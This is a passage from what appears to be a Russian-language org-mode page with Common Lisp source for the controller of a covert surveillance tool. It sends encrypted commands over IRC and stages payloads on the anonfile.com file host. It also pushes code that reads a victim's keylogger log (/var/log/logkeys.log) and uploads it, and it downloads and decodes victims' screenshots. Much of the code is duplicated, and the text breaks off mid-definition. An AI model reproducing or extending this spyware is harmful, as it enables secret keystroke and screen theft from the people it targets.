  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

(defun upload-code-and-send (code key seed)
  (let* ((code-link (upload-code code key))
         (cmd (format nil "(update \"~A\" ~A)" code-link key))
         (enc (encode cmd seed)))
    (sendmsg enc)))

;; (upload-code-and-send "(alfa)" 1234567890 3784753813)

(defun hi-rule-consequent (str src)
  (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890)
         (receiver (parse-integer (subseq src 1)))
         (code (format
                nil
                "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
                tmpkey)))
    (upload-code-and-send code tmpkey receiver)))

;; (let* ((tmpkey 1234567890)
;;        (src "b3785294860")
;;        (receiver (parse-integer (subseq src 1)))
;;        (code (format
;;               nil
;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
;;               tmpkey)))
;;   (upload-code-and-send code tmpkey receiver))
(defun k-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))

(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun k-rule-consequent (str src)
  (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890))
    (alexandria:write-string-into-file
     (download-and-decrypt (subseq str 1) tmpkey)
     (format nil "~~/wnt/~A.log" (ppcre:regex-replace-all "/" str "_")))))

(defparameter *op-rules*
  (list (cons #'shot-rule-antecedent  #'shot-rule-consequent)
        (cons #'hi-rule-antecedent    #'hi-rule-consequent)
        (cons #'k-rule-antecedent     #'k-rule-consequent)))

(defparameter *op-cmd*
  (lambda (param)
    (block op-cmd-block
      (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
             (src  (CL-IRC:SOURCE param))
             ;; (oct  (decrypt msg *op-sess*))
             ;; (str  (handler-case
             ;;           (flex:octets-to-string oct :external-format :utf-8)
             ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
             (str msg)
             )
        (dbg ":: op-cmd ~A: ~A~%" src str)
        (block op-rules-dispatcher
          (let ((applyed_rules 0))
            (loop :for (antecedent . consequent) :in *op-rules* :do
                 (when (funcall antecedent str src)
                   (incf applyed_rules)
                   (dbg ":: op-cmd rule: ~A~%" consequent)
                   (when (funcall consequent str src)
                     (return-from op-rules-dispatcher nil))))
            (when (&gt; 0 applyed_rules)
              (dbg "::UNKMSG [~A] from [~A]~%" str src))
            (finish-output)))
        ))))

(defun op-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *op-cmd* param)
  t)
</pre>
</div>
</div>
</div>

<div id="outline-container-orgbd171f3" class="outline-3">
<h3 id="orgbd171f3">Rule-based Command Processor</h3>
<div class="outline-text-3" id="text-orgbd171f3">
<p>
Ну вот, теперь осталось правильно реагировать на команды. Чтобы
распознать команду мы будем применять диспетчер, работающий как система
правил. Он опирается на список правил, каждая из которых представляет
пару (условие . действие).
</p>

<p>
Правила должны иметь возможность делать что-то асинхронно, для этого мы
подключаем механизм очередей.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orga1a2073">(defun shot-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

(defun shot-rule-consequent (str src)
  (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (ins-task (make-task :class 'task
                       :data (list str src)
                       :code #'identity)))

;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
(defun hi-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^hi$" str))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; encrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

(defun upload-code-and-send (code key seed)
  (let* ((code-link (upload-code code key))
         (cmd (format nil "(update \"~A\" ~A)" code-link key))
         (enc (encode cmd seed)))
    (sendmsg enc)))

;; (upload-code-and-send "(alfa)" 1234567890 3784753813)

(defun hi-rule-consequent (str src)
  (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890)
         (receiver (parse-integer (subseq src 1)))
         (code (format
                nil
                "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
                tmpkey)))
    (upload-code-and-send code tmpkey receiver)))

;; (let* ((tmpkey 1234567890)
;;        (src "b3785294860")
;;        (receiver (parse-integer (subseq src 1)))
;;        (code (format
;;               nil
;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
;;               tmpkey)))
;;   (upload-code-and-send code tmpkey receiver))
(defun k-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))

(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun k-rule-consequent (str src)
  (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890))
    (alexandria:write-string-into-file
     (download-and-decrypt (subseq str 1) tmpkey)
     (format nil "~~/wnt/~A.log" (ppcre:regex-replace-all "/" str "_")))))

(defparameter *op-rules*
  (list (cons #'shot-rule-antecedent  #'shot-rule-consequent)
        (cons #'hi-rule-antecedent    #'hi-rule-consequent)
        (cons #'k-rule-antecedent     #'k-rule-consequent)))

(defparameter *op-cmd*
  (lambda (param)
    (block op-cmd-block
      (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
             (src  (CL-IRC:SOURCE param))
             ;; (oct  (decrypt msg *op-sess*))
             ;; (str  (handler-case
             ;;           (flex:octets-to-string oct :external-format :utf-8)
             ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
             (str msg)
             )
        (dbg ":: op-cmd ~A: ~A~%" src str)
        (block op-rules-dispatcher
          (let ((applyed_rules 0))
            (loop :for (antecedent . consequent) :in *op-rules* :do
                 (when (funcall antecedent str src)
                   (incf applyed_rules)
                   (dbg ":: op-cmd rule: ~A~%" consequent)
                   (when (funcall consequent str src)
                     (return-from op-rules-dispatcher nil))))
            (when (&gt; 0 applyed_rules)
              (dbg "::UNKMSG [~A] from [~A]~%" str src))
            (finish-output)))
        ))))
</pre>
</div>
</div>
</div>

<div id="outline-container-orgcfeee8b" class="outline-3">
<h3 id="orgcfeee8b">Shot Rule</h3>
<div class="outline-text-3" id="text-orgcfeee8b">
<p>
Правило для скриншотов просто проверяет сообщение на соответствие
регулярному выражению. Если есть совпадение - мы должны как минимум
скачать и сохранить данные.
</p>

<p>
Однако, скачивание может наткнуться на сбой сети и зависнуть, и в этом
случае хук никогда не завершиться и соответственно зависнет цикл чтения
IRC-сообщений, потому что хук выполняется в его контексте. Поэтому вместо
того, чтобы начать скачивание и обработку - мы делаем отложенную задачу и
помещаем её в очередь.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orgb8aa04e">(defun shot-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

(defun shot-rule-consequent (str src)
  (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (ins-task (make-task :class 'task
                       :data (list str src)
                       :code #'identity)))

;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
</pre>
</div>
</div>
</div>

<div id="outline-container-orgb5c4ae1" class="outline-3">
<h3 id="orgb5c4ae1">Queues</h3>
<div class="outline-text-3" id="text-orgb5c4ae1">
<p>
Когда мы скачиваем файл с файлообменника - это может окончиться
неудачей. В этом случае удобно обрабатывать такие сбои в CPS-стиле,
особенно когда мы хотим запускать скачку паралельно, в несколько
потоков.
</p>

<p>
Чтобы отвязать запуск потоков от системы правил мы будем использовать
очередь, в которую будем добавлять задания на обработку. Преимуществом
такого подхода может быть возможность ссылаться на ранее выполнявшиеся
задания.
</p>

<p>
Структуру задания определим так:
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org3e943ef">(defstruct task
  class
  data
  code)
</pre>
</div>

<p>
Для обслуживания очереди нам понадобится сама очередь и блокировка на
ней:
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org4035ebc">(defparameter *task-queue* nil)
(defparameter *task-queue-lock* (bt:make-lock "task-queue-lock"))
</pre>
</div>

<p>
Теперь можно добавить операции для добавления и удаления из очереди
заданий.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org71ada92">(defun ins-task (task)
  (bt:with-lock-held (*task-queue-lock*)
    (setf *task-queue*
          (append *task-queue*
                  (list task)))))

(defun pop-task ()
  (bt:with-lock-held (*task-queue-lock*)
    (pop *task-queue*)))

(defun length-of-queue ()
  (bt:with-lock-held (*task-queue-lock*)
    (length *task-queue*)))
</pre>
</div>

<p>
Теперь соединим все вместе
</p>

<p>
[TODO:gmm] Надо еще добавить менеджер очередей в отдельном потоке,
который разбирает и выполняет задачи.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orgbe3c992">(defstruct task
  class
  data
  code)
(defparameter *task-queue* nil)
(defparameter *task-queue-lock* (bt:make-lock "task-queue-lock"))
(defun ins-task (task)
  (bt:with-lock-held (*task-queue-lock*)
    (setf *task-queue*
          (append *task-queue*
                  (list task)))))

(defun pop-task ()
  (bt:with-lock-held (*task-queue-lock*)
    (pop *task-queue*)))

(defun length-of-queue ()
  (bt:with-lock-held (*task-queue-lock*)
    (length *task-queue*)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org334b000" class="outline-3">
<h3 id="org334b000">Task Function</h3>
<div class="outline-text-3" id="text-org334b000">
<p>
Эта функция вызывается каждый раз, когда нужно обработать задачу из
очереди. Она получает задачу в переменной <code>current-task</code>.
</p>

<p>
Сейчас ей остается только вызвать <code>shot-downloader</code>, передав ему
параметры из задачи.
</p>

<p>
Вохможные ошибки:
</p>
<ul class="org-ul">
<li>DRAKMA-SIMPLE-ERROR</li>
<li>USOCKET:TIMEOUT-ERROR
 0: (USOCKET::HANDLE-CONDITION #&lt;TIMEOUT {10081C8003}&gt; #&lt;USOCKET:STREAM-USOCKET {1009E19C23}&gt;)
 1: (SIGNAL #&lt;TIMEOUT {10081C8003}&gt;)
 2: (ERROR TIMEOUT)
 3: (USOCKET:SOCKET-CONNECT "cdn-15.anonfile.com" 443 :PROTOCOL :STREAM :ELEMENT-TYPE FLEXI-STREAMS:OCTET :TIMEOUT 20 :DEADLINE NIL :NODELAY :IF-SUPPORTED :LOCAL-HOST NIL :LOCAL-PORT NIL)
 4: (DRAKMA:HTTP-REQUEST #&lt;PURI:URI <a href="https://cdn-15.anonfile.com/1220S2Z6ne/73a95882-1581856714/3790844909_4">https://cdn-15.anonfile.com/1220S2Z6ne/73a95882-1581856714/3790844909_4</a>&gt; :USER-AGENT "Mozilla/5.0 (X11; Ubuntu; Linux x86<sub>64</sub>; rv:70.0) Gecko/20100101 Firefox/70.0" :COO..
 5: (ANON-FILE-DOWNLOAD "/1220S2Z6ne/3790844909<sub>4</sub>")
 6: (SHOT-DOWNLOADER "/1220S2Z6ne/3790844909<sub>4</sub>" "b3790844681")
 7: ((LAMBDA NIL :IN BORDEAUX-THREADS::BINDING-DEFAULT-SPECIALS))
 8: ((FLET #:WITHOUT-INTERRUPTS-BODY-1156 :IN SB-THREAD::INITIAL-THREAD-FUNCTION-TRAMPOLINE))
 9: ((FLET SB-THREAD::WITH-MUTEX-THUNK :IN SB-THREAD::INITIAL-THREAD-FUNCTION-TRAMPOLINE))
10: ((FLET #:WITHOUT-INTERRUPTS-BODY-359 :IN SB-THREAD::CALL-WITH-MUTEX))
11: (SB-THREAD::CALL-WITH-MUTEX #&lt;CLOSURE (FLET SB-THREAD::WITH-MUTEX-THUNK :IN SB-THREAD::INITIAL-THREAD-FUNCTION-TRAMPOLINE) {7FFFE396ED5B}&gt; #&lt;SB-THREAD:MUTEX "thread result lock" owner: #&lt;SB-THREAD:THR..
12: (SB-THREAD::INITIAL-THREAD-FUNCTION-TRAMPOLINE #&lt;SB-THREAD:THREAD "task-th" RUNNING {1009DA0833}&gt; NIL #&lt;CLOSURE (LAMBDA NIL :IN BORDEAUX-THREADS::BINDING-DEFAULT-SPECIALS) {1009DA07BB}&gt; (#&lt;SB-THREAD:T..
13: ("foreign function: call<sub>into</sub><sub>lisp</sub>")
14: ("foreign function: new<sub>thread</sub><sub>trampoline</sub>")</li>
</ul>

<p>
Даже если ошибка не будет обработана (как сейчас) по истечении таймаута
поток будет удален, так что на работоспособность решения это не повлияет
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org07e7eb1">;; anon_file_download
(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-download-link (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings
              "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
              str)
           (when match-p (return (aref result 0))))))

(defun anon-file-download (filename)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request (format nil "https://anonfile.com~A" filename)
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (link (get-download-link text)))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request link
             :user-agent *user-agent*
             :cookie-jar cookie-jar
             :additional-headers *additional-headers*
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; unpack_img
(defun unpack-img (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash width 3))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8))))
    (declare (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (do ((qy 0 (incf qy)))
        ((= qy height))
      (declare (type fixnum qy))
      (do ((qx 0 (incf qx)))
          ((= qx width))
        (declare (type fixnum qx))
        (let ((acc (aref image qy qx)))
          (declare (type (unsigned-byte 8) acc))
          ;; (format t "~8,'0B" acc)
          (do ((out 0 (incf out))
               (in  7 (decf in)))
              ((= 8 out))
            (declare (type fixnum out in))
            (unless (= 0 (logand acc (ash 1 in)))
              (setf (aref result qy (logior (ash qx 3) out))
                    255)))))
      ;; (format t "~%")
      )
    result))

;; TEST
;; (print
;;  (unpack-img
;;   (pack-img
;;    (x-snapshot :width 31 :height 23))))

;; TEST
;; (time
;;  (let* ((image  (load-png "FILE1088"))
;;         (unpack (unpack-img image))
;;         (dims (array-dimensions unpack)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              unpack
;;              :grayscale)))

(defun shot-downloader (str src)
  (let* ((key (parse-integer (subseq src 1)))
         (enc (anon-file-download str))
         (dec (decrypt enc key))
         (png (let ((png-read::*png-file* "fake-file"))
                (flex:with-input-from-sequence (stream dec)
                  (png-read:read-png-datastream stream))))
         (image-data (png-read:image-data png))
         ;; reverse
         (dims   (subseq (array-dimensions image-data) 0 2))
         (height (cadr dims))
         (width  (car  dims))
         (image ;; меняем размерности X и Y местами
          (let ((result (make-array (list height width)
                                    :element-type '(unsigned-byte 8))))
            (do ((y 0 (incf y)))
                ((= y height))
              (do ((x 0 (incf x)))
                  ((= x width))
                (setf (aref result y x)
                      (aref image-data x y))))
            result))
         ;; (dif (ppcre:scan-to-strings "/(.*)/([0-9]*)_([0-9]*)" str))
         ;; (img (if (not dif)
         ;;          (setf prev image)
         ;;          ;; else
         ;;          (setf prev (get-img-diff dims prev image))))
         (img image)
         ;; unpacking
         (unpack (unpack-img img))
         (unpack-dims (array-dimensions unpack))
         (new-width (cadr unpack-dims))
         (fname-str (multiple-value-bind (match-p result)
                        (ppcre:scan-to-strings "/.*/(.*)" str)
                      (elt result 0))))
    (let* ((png (make-instance 'zpng:png
                               :width new-width
                               :height height
                               :color-type :grayscale))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height new-width (zpng:samples-per-pixel png))
                    :displaced-to unpack :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      (zpng:write-png png (format nil "~~/wnt/~A" fname-str)))
    t))

(defun task ()
  (destructuring-bind (str src)
      (task-data *current-task*)
    ;; (dbg ":: TF (~A): ~A: ~A~%" (length-of-queue) src str)
    (shot-downloader str src)))
</pre>
</div>
</div>
</div>

<div id="outline-container-orge6c687e" class="outline-3">
<h3 id="orge6c687e">Shot Downloader</h3>
<div class="outline-text-3" id="text-orge6c687e">
<p>
Однако, необходимо описать операцию, которая будет вызываться из таска и
выполнять всю грязную работу.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org907c913">;; anon_file_download
(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-download-link (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings
              "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
              str)
           (when match-p (return (aref result 0))))))

(defun anon-file-download (filename)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request (format nil "https://anonfile.com~A" filename)
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (link (get-download-link text)))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request link
             :user-agent *user-agent*
             :cookie-jar cookie-jar
             :additional-headers *additional-headers*
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; unpack_img
(defun unpack-img (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash width 3))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8))))
    (declare (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (do ((qy 0 (incf qy)))
        ((= qy height))
      (declare (type fixnum qy))
      (do ((qx 0 (incf qx)))
          ((= qx width))
        (declare (type fixnum qx))
        (let ((acc (aref image qy qx)))
          (declare (type (unsigned-byte 8) acc))
          ;; (format t "~8,'0B" acc)
          (do ((out 0 (incf out))
               (in  7 (decf in)))
              ((= 8 out))
            (declare (type fixnum out in))
            (unless (= 0 (logand acc (ash 1 in)))
              (setf (aref result qy (logior (ash qx 3) out))
                    255)))))
      ;; (format t "~%")
      )
    result))

;; TEST
;; (print
;;  (unpack-img
;;   (pack-img
;;    (x-snapshot :width 31 :height 23))))

;; TEST
;; (time
;;  (let* ((image  (load-png "FILE1088"))
;;         (unpack (unpack-img image))
;;         (dims (array-dimensions unpack)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              unpack
;;              :grayscale)))

(defun shot-downloader (str src)
  (let* ((key (parse-integer (subseq src 1)))
         (enc (anon-file-download str))
         (dec (decrypt enc key))
         (png (let ((png-read::*png-file* "fake-file"))
                (flex:with-input-from-sequence (stream dec)
                  (png-read:read-png-datastream stream))))
         (image-data (png-read:image-data png))
         ;; reverse
         (dims   (subseq (array-dimensions image-data) 0 2))
         (height (cadr dims))
         (width  (car  dims))
         (image ;; меняем размерности X и Y местами
          (let ((result (make-array (list height width)
                                    :element-type '(unsigned-byte 8))))
            (do ((y 0 (incf y)))
                ((= y height))
              (do ((x 0 (incf x)))
                  ((= x width))
                (setf (aref result y x)
                      (aref image-data x y))))
            result))
         ;; (dif (ppcre:scan-to-strings "/(.*)/([0-9]*)_([0-9]*)" str))
         ;; (img (if (not dif)
         ;;          (setf prev image)
         ;;          ;; else
         ;;          (setf prev (get-img-diff dims prev image))))
         (img image)
         ;; unpacking
         (unpack (unpack-img img))
         (unpack-dims (array-dimensions unpack))
         (new-width (cadr unpack-dims))
         (fname-str (multiple-value-bind (match-p result)
                        (ppcre:scan-to-strings "/.*/(.*)" str)
                      (elt result 0))))
    (let* ((png (make-instance 'zpng:png
                               :width new-width
                               :height height
                               :color-type :grayscale))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height new-width (zpng:samples-per-pixel png))
                    :displaced-to unpack :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      (zpng:write-png png (format nil "~~/wnt/~A" fname-str)))
    t))
</pre>
</div>
</div>
</div>

<div id="outline-container-org1497c60" class="outline-3">
<h3 id="org1497c60">Anon File Download</h3>
<div class="outline-text-3" id="text-org1497c60">
<div class="org-src-container">
<pre class="src src-lisp" id="org22a5828">(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
